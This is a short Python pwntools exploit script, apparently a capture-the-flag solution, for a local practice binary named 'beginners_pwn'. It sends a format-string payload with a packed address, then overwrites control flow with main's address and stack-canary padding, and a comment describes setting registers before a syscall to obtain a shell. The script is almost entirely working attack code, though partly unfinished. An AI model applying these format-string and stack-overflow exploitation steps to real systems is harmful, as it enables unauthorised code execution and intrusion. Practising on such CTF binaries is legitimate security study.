#!/usr/bin/python
from pwn import *

# socat TCP-L:5555,reuseaddr,fork EXEC:./beginners_pwn

host = "localhost"
port = 5555

#p = remote(host,port)
p = process("../../bin/pwn1/beginners_pwn")
gdb.attach(p)
raw_input("enter to start exploit!")
payload = b"%7$s%sAA"
payload += p64(0x404018)
p.sendline(payload)

raw_input("enter agant to send third payload")
p.sendline(p64(0x00000000401203))#main addr
p.sendline("B"*15) # its for overflow stack canary

'''
this program use syscall
-> just setting register before jump into syscall() -> we got a shell
'''


p.interactive()



#__vfscanf_internal+6225